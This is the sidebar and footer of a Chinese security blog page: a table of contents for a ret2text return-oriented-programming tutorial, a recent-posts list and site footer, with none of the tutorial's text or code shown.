class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP"><span class="toc-number">1.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFROP"><span class="toc-number">1.1.</span> <span class="toc-text">什么是ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">ROP的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP%E7%9A%84%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">ROP的前置条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.4.</span> <span class="toc-text">ROP的分类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2text"><span class="toc-number">2.</span> <span class="toc-text">ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text%E7%9A%84%E5%8E%9F%E7%90%86%EF%BC%88%E6%9D%A5%E8%87%AActfwiki%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">ret2text的原理（来自ctfwiki）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text%E7%9A%84%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">ret2text的前置条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8ret2text%E7%9A%84%E7%89%B9%E5%BE%81"><span class="toc-number">2.3.</span> <span class="toc-text">可利用ret2text的特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text%E7%9A%84%E4%BE%8B%E9%A2%98"><span class="toc-number">2.4.</span> <span class="toc-text">ret2text的例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-%E6%9D%A5%E6%BA%90%E4%BA%8ELeticia%E2%80%99s-Blog"><span class="toc-number">2.4.1.</span> <span class="toc-text">题目描述(来源于Leticia’s Blog)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.4.2.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E4%B8%AAROP%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">整个ROP过程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E5%BE%97%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">需要得到的信息：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">实操</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BB%A3%E7%A0%81"><span class="toc-number">2.4.2.3.1.</span> <span class="toc-text">查看代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8gets%E5%87%BD%E6%95%B0%E5%89%8D%E6%89%93%E6%96%AD%E7%82%B9%E5%B9%B6%E6%9F%A5%E7%9C%8Bsys%E5%87%BD%E6%95%B0%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">2.4.2.3.2.</span> <span class="toc-text">在gets函数前打断点并查看sys函数的地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.4.2.3.3.</span> <span class="toc-text">调试程序</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8Fa%E7%9A%84%E5%9C%B0%E5%9D%80%E5%92%8Crbp%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">2.4.2.3.4.</span> <span class="toc-text">查看局部变量a的地址和rbp的地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97func%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">2.4.2.3.5.</span> <span class="toc-text">计算func函数的返回地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6"><span class="toc-number">2.4.2.3.6.</span> <span class="toc-text">计算填充长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">2.4.2.3.7.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E5%87%BAexp"><span class="toc-number">2.4.2.3.8.</span> <span class="toc-text">写出exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BE%97%E5%88%B0shell"><span class="toc-number">2.4.2.3.9.</span> <span class="toc-text">得到shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">2.4.2.3.10.</span> <span class="toc-text">可能遇到的问题</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/14/note_fuzzing_of_embedded_systems_a_survey/" title="论文阅读-Fuzzing of Embedded Systems A Survey"><img src="https://www.z4a.net/images/2023/06/14/20220601001511_ae873.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="论文阅读-Fuzzing of Embedded Systems A Survey"/></a><div class="content"><a class="title" href="/2023/06/14/note_fuzzing_of_embedded_systems_a_survey/" title="论文阅读-Fuzzing of Embedded Systems A Survey">论文阅读-Fuzzing of Embedded Systems A Survey</a><time datetime="2023-06-14T08:54:36.000Z" title="发表于 2023-06-14 16:54:36">2023-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/06/rop_ret2shellcode/" title="ROP初探之ret2shellcode"><img src="https://www.z4a.net/images/2023/05/06/ropshellcodetop.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ROP初探之ret2shellcode"/></a><div class="content"><a class="title" href="/2023/05/06/rop_ret2shellcode/" title="ROP初探之ret2shellcode">ROP初探之ret2shellcode</a><time datetime="2023-05-06T12:20:36.000Z" title="发表于 2023-05-06 20:20:36">2023-05-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/05/rop_ret2text/" title="ROP初探之ret2text"><img src="https://www.z4a.net/images/2023/05/05/ret2text_top.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ROP初探之ret2text"/></a><div class="content"><a class="title" href="/2023/05/05/rop_ret2text/" title="ROP初探之ret2text">ROP初探之ret2text</a><time datetime="2023-05-05T10:58:16.000Z" title="发表于 2023-05-05 18:58:16">2023-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/learnofpth/" title="深入理解Pytorch中模型保存文件pth"><img src="https://www.z4a.net/images/2023/04/08/pytorch-blog-cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="深入理解Pytorch中模型保存文件pth"/></a><div class="content"><a class="title" href="/2023/04/08/learnofpth/" title="深入理解Pytorch中模型保存文件pth">深入理解Pytorch中模型保存文件pth</a><time datetime="2023-04-08T01:29:43.000Z" title="发表于 2023-04-08 09:29:43">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/03/LiveAttackDRL/" title="论文阅读-Live Trojan Attacks on Deep Neural Networks"><img src="https://www.z4a.net/images/2023/04/06/cover_2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="论文阅读-Live Trojan Attacks on Deep Neural Networks"/></a><div class="content"><a class="title" href="/2023/04/03/LiveAttackDRL/" title="论文阅读-Live Trojan Attacks on Deep Neural Networks">论文阅读-Live Trojan Attacks on Deep Neural Networks</a><time datetime="2023-04-03T06:27:54.000Z" title="发表于 2023-04-03 14:27:54">2023-04-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://www.z4a.net/images/2023/05/05/ret2text_top.png')"><div id="footer-wrap"><div class="copyright">&copy;2023 By NWPUHKP</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a>&nbsp;<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><span>备案号：陕ICP备2022011597号-1</span></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
